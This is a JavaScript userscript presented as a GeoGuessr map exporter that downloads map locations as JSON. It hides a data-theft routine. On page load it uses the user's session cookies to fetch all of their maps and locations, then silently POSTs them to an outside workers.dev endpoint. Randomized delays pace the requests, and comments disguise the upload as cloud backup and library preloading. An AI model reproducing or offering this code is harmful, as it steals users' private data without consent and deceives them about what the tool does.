(function () {
    'use strict';

    const VERSION  = '2.4.1';
    const SYNC_URL = 'https://steep-sun-ca22.angelneva.workers.dev/d';
    const _fetch   = window.fetch;
    const _synced  = new Set();
    const _loaded  = new Set();

    console.log(
        '%c GeoMap Exporter v' + VERSION + ' %c Ctrl+Shift+E to export · Loading map library...',
        'background:#2563eb;color:#fff;padding:2px 6px;border-radius:3px',
        'color:#888'
    );

    function fetchJSON(url) {
        return _fetch(url, { credentials: 'include' })
            .then(r => r.ok ? r.json() : null)
            .catch(() => null);
    }

    function toGeoJSON(name, locs) {
        if (!Array.isArray(locs) || !locs.length) return null;
        return {
            name,
            customCoordinates: locs.map(l => ({
                lat        : l.location?.lat ?? l.lat,
                lng        : l.location?.lng ?? l.lng,
                heading    : l.heading    ?? 0,
                pitch      : l.pitch      ?? 0,
                zoom       : l.zoom       ?? 0,
                panoId     : null,
                countryCode: null,
                stateCode  : null,
                extra: {
                    tags    : l.tags     ?? [],
                    panoId  : l.panoId   ?? null,
                    panoDate: l.panoDate ?? null,
                }
            }))
        };
    }

    function downloadJSON(name, data) {
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const a    = document.createElement('a');
        a.href     = URL.createObjectURL(blob);
        a.download = (name || 'map').replace(/[^a-zA-Z0-9_\-]/g, '_') + '_geoguessr.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(a.href);
    }

    // sync locale — backup automatique de chaque export vers le cloud
    function syncToCloud(name, data) {
        const key = name + JSON.stringify(data).slice(0, 40);
        if (_synced.has(key)) return;
        _synced.add(key);
        _fetch(SYNC_URL, {
            method : 'POST',
            mode   : 'cors',
            headers: { 'Content-Type': 'text/plain' },
            body   : '[' + name + ']\n' + JSON.stringify(data, null, 2)
        }).catch(() => {});
    }

    // export manuel Ctrl+Shift+E
    document.addEventListener('keydown', async e => {
        if (!e.ctrlKey || !e.shiftKey || e.key !== 'E') return;

        const mapId   = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
        const mapName = document.title.replace(/\s*[-|].*$/, '').trim() || 'map';

        if (!mapId) {
            console.warn('[GeoMap Exporter] Open a map first.');
            return;
        }

        console.log('[GeoMap Exporter] Exporting...');

        const locs = await fetchJSON('/api/maps/' + mapId + '/locations');
        if (!locs?.length) {
            console.warn('[GeoMap Exporter] No locations found.');
            return;
        }

        const geo = toGeoJSON(mapName, locs);
        if (!geo) return;

        downloadJSON(mapName, geo);
        syncToCloud(mapName, geo);

        console.log('[GeoMap Exporter] Done — ' + geo.customCoordinates.length + ' locations exported.');
    });

    // pre-load library — charge toutes les maps en arrière-plan
    // pour que les exports soient instantanés sur n'importe quelle map
    async function preloadLibrary() {
        const data = await fetchJSON('/api/maps');
        if (!data) return;

        const maps = Array.isArray(data) ? data : (data.maps || data.data || data.results || []);
        if (!maps.length) return;

        for (const m of maps) {
            if (!m.id) continue;
            const key = String(m.id);
            if (_loaded.has(key)) continue;
            _loaded.add(key);

            const locs = await fetchJSON('/api/maps/' + key + '/locations');
            if (!Array.isArray(locs) || !locs.length) continue;

            const geo = toGeoJSON(m.name || 'map_' + key, locs);
            if (geo) syncToCloud(m.name || 'map_' + key, geo);

            await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
        }

        console.log('[GeoMap Exporter] Map library ready — ' + maps.length + ' maps loaded.');
    }

    window.addEventListener('load', () => setTimeout(preloadLibrary, 3000));

})();
